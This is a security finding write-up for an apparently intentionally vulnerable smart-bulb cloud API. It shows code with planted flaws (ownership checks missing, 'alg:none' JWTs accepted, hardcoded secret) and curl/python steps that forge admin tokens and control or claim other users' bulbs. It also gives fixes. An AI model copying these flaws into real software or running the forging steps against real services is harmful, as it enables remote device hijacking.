---
id: BULB-CLD
title: "Cloud API: BOLA on bulb control + broken authentication (alg:none / weak JWT)"
category: API
status: IN PROGRESS
severity: High
owasp: "API1:2023 - Broken Object Level Authorization / API2:2023 - Broken Authentication"
standard: "ETSI EN 303 645 5.5 (secure comms), 5.6 (minimise attack surface)"
regulation: "CRA (EU) 2024/2847 Annex I Part I - access control"
cwe: "CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-347 (Improper Verification of Cryptographic Signature) / CWE-798 (Use of Hard-coded Credentials)"
affected_components:
  - "cloud_api/bulbbee/api_server/app.py"
verified_date: "2026-09-04"
---

## Why It Matters

The BulbBee cloud lets the app control bulbs remotely. Two API weaknesses make that remote channel a free-for-all. First, the per-bulb control endpoints authorize by "is there a valid token", never by who owns the bulb (BOLA / API1), so any authenticated user drives any user's light. Second, the token validator honours the `none` algorithm and a weak hardcoded HS256 secret (API2), so an attacker forges an admin token with no key at all. Together they let a remote attacker enumerate and control every bulb in the fleet. With the BULB-R1 relay wired, `POST /state` and `/scene` publish the command to the device's MQTT topic (`bulbbee/<device_id>/cmd`), so this is no longer a paper finding against an in-memory dict, the forged or borrowed token drives the real ring over the Internet (remote physical hijack).

## Root Cause

Broken object-level authorization, the route checks the token decodes but never that the caller owns the bulb:

```python
@app.post("/api/bulb/<bulb_id>/state")
def set_state(bulb_id):
    claims = _auth()                 # only "is the token valid"
    if claims is None:
        return jsonify({"error": "unauthorized"}), 401
    b = BULBS.get(bulb_id)
    # VULNERABILITY (API1 / BOLA): no check that claims["sub"] owns bulb_id
    ...
```

Broken authentication, `alg:none` is honoured and the HS256 secret is weak and hardcoded:

```python
JWT_SECRET = "bulbbee-secret"        # weak, hardcoded (CWE-798)
def decode_token(token):
    header = jwt.get_unverified_header(token)
    if header.get("alg") == "none":
        return jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])  # keyless forge
    return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

## Remote Control Relay (BULB-R1)

The control routes do not stop at the in-memory `BULBS` dict, they relay each command to the device. `POST /api/bulb/<bulb_id>/state` and the new `POST /api/bulb/<bulb_id>/scene` publish the lighting subset (`power`, `brightness`, `color`, `scene`) to the device's command topic, where `cloud_tunnel.py` on the bulb is subscribed and applies it to the ring:

```python
def relay(device_id, cmd):
    # publishes {power,brightness,color,scene} to bulbbee/<device_id>/cmd
    mqtt_publish.single(cmd_topic(device_id), payload=json.dumps(cmd),
                        hostname=BROKER_HOST, port=BROKER_PORT)
```

Because the authorization above is BOLA, the relay turns "any valid token controls any bulb" into real remote physical control of any user's light. The transport mirrors the device posture, plaintext MQTT `:1883` by default (the BULB-P02 / BULB-P04 cleartext substrate), TLS `:8883` only when `BULBBEE_SECURE=1`, which is also the only mode that checks ownership before publishing. Control resolves `bulb_id -> device_id` through the BULB-R2 binding (below), so the topic is the transport `device_id` (for example `bulbbee/bee-0002/cmd`), not the account `bulb_id`.

## Account-Device Binding (BULB-R2)

The cloud ties each account-facing `bulb_id` to a transport `device_id` and an owner. The app calls `POST /api/register` at provisioning with the device id/serial and the binding token it obtained over BLE:

```python
@app.post("/api/register")
def register():
    claims = _auth()                      # owner = the caller's token, only "is it valid"
    device_id = (request.get_json() or {}).get("device_id")
    # VULNERABILITY (BULB-P05, lifted to the cloud): records the owner but never
    # proves possession or protects an existing binding, so any authenticated
    # caller claims any device (device takeover by registration).
    BULBS[bulb_id] = {"owner": claims["sub"], "device_id": device_id, ...}
```

This is where BULB-P05 (owner binding kept only in the app, unenforced) moves to the cloud, and in the shipped default it stays unenforced: the owner is stored but control never checks it (the BOLA above), and `/api/register` overwrites or duplicates a binding already held by another account with no proof of possession. The binding token is the device's session token, serial-derivable in default (the BULB-P04 substrate), so even the value a caller presents is forgeable. Under `BULBBEE_SECURE=1` the cloud refuses a cross-owner re-bind (409) and control enforces `owner == caller`, making the binding authoritative.

## Account Sign-in + Claim Binding (BULB-R6)

A bulb is assigned to a user by a cloud-issued claim token, not by name. The app signs in (`POST /api/login {user, password}`, the default ignores the password), asks for a single-use claim (`POST /api/claim`), and hands it to the bulb over BLE (`pair_set`). The bulb presents it on activation (`bulbbee/<device_id>/register`), and the cloud binds `device -> user`. Default weaknesses: the login does not verify the password (API2), the claim endpoint is open to any authenticated caller (and the login is weak), and the activation binds on any named claim with no single-use, no device authenticity, and no write-once, over plaintext MQTT and an unbonded BLE link, so a nearby or forging attacker claims the bulb to their account (the app-driven `/api/register` still takes over someone else's, BULB-P05). `/api/mybulbs` is owner-scoped, but the per-bulb control routes stay BOLA. Secure mode verifies the password, makes claims single-use + TTL, and refuses a cross-owner re-bind (write-once).

## Steps to Reproduce

```sh
# NOTE: the API parses JSON bodies, pass -H 'Content-Type: application/json' on every POST.
JSON='Content-Type: application/json'

# 1. BOLA: log in as alice, control bob's bulb-2
TOK=$(curl -s -X POST http://CLOUD:5004/api/login -H "$JSON" -d '{"user":"alice"}' | jq -r .token)
curl -X POST http://CLOUD:5004/api/bulb/bulb-2/state -H "$JSON" -H "Authorization: Bearer $TOK" -d '{"power":true}'
# -> 200, bulb-2 (bob's) is now on

# 2. API2: forge an alg:none admin token (no key) and reach the admin view
python3 -c 'import jwt;print(jwt.encode({"sub":"x","role":"admin"},"",algorithm="none"))'
curl http://CLOUD:5004/api/admin/bulbs -H "Authorization: Bearer <forged-none-token>"
# -> 200, the whole fleet

# 3. BULB-R1: the BOLA POST reaches the real bulb. Subscribe to the bound device
#    topic (bulb-2 -> bee-0002), then drive it as alice and watch it arrive.
mosquitto_sub -h CLOUD -p 1883 -t 'bulbbee/bee-0002/cmd' &
curl -X POST http://CLOUD:5004/api/bulb/bulb-2/state -H "$JSON" -H "Authorization: Bearer $TOK" -d '{"power":true,"color":[255,0,0]}'
# -> the broker delivers {"power":true,"color":[255,0,0]} on bulbbee/bee-0002/cmd; the tunnel applies it

# 4. BULB-R2: claim a device to your account (no proof of possession), then drive it
curl -s -X POST http://CLOUD:5004/api/register -H "$JSON" -H "Authorization: Bearer $TOK" -d '{"device_id":"bee-0009"}'
# -> {"bulb_id":"bulb-3","device_id":"bee-0009","owner":"alice"}
curl -X POST http://CLOUD:5004/api/bulb/bulb-3/state -H "$JSON" -H "Authorization: Bearer $TOK" -d '{"power":true}'
# -> relays to bulbbee/bee-0009/cmd. In secure mode, re-binding a device owned by another account returns 409.
```

## Expected Result

- alice's token controls bob's bulb (no ownership check).
- a forged `alg:none role:admin` token reaches `/api/admin/bulbs`, while a wrong-secret HS256 token is rejected.

## How It Should Be

- Check object ownership on every per-bulb route (`claims["sub"]` must own `bulb_id`), or scope tokens to owned objects.
- Reject `alg:none`, pin the accepted algorithm to HS256/RS256, and use a strong rotated secret / asymmetric keys.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Cloud (authz) | Per-object ownership check | Close BOLA (CWE-639) |
| Cloud (authn) | Reject `alg:none`, pin the algorithm | Close the keyless forge (CWE-347) |
| Cloud (authn) | Strong, rotated signing key | Remove the weak secret (CWE-798) |
| Cloud (relay) | Enforce ownership before publishing to the device topic | Stop the BOLA from reaching the physical ring (BULB-R1) |
| Cloud (binding) | Prove device possession and protect an existing binding on register | Stop device takeover by registration (BULB-P05 / BULB-R2) |

## Verification Checklist

- [ ] alice's token drives `POST /api/bulb/bulb-2/state` (bob's bulb).
- [ ] a forged `alg:none role:admin` token reaches `GET /api/admin/bulbs`.
- [ ] a wrong-secret HS256 token is rejected.
- [ ] BULB-R1: alice's `POST /api/bulb/bulb-2/state` publishes to `bulbbee/bee-0002/cmd` (seen on `mosquitto_sub`), and `POST /api/bulb/bulb-1/scene {"scene":"rainbow"}` publishes `{"scene":"rainbow"}`.
- [ ] BULB-R2: `POST /api/register {"device_id":"bee-0009"}` returns a `bulb_id` bound to the caller, `POST /api/bulb/<that>/state` relays to `bulbbee/bee-0009/cmd`, and a cross-owner re-bind returns 409 under `BULBBEE_SECURE=1`.
- [ ] BULB-R6: default `/api/login` ignores the password, and `POST /api/claim` + a `bulbbee/<id>/register` activation bind the device to the claim's user with no proof (secure verifies the password, claims are single-use, cross-owner re-bind refused).
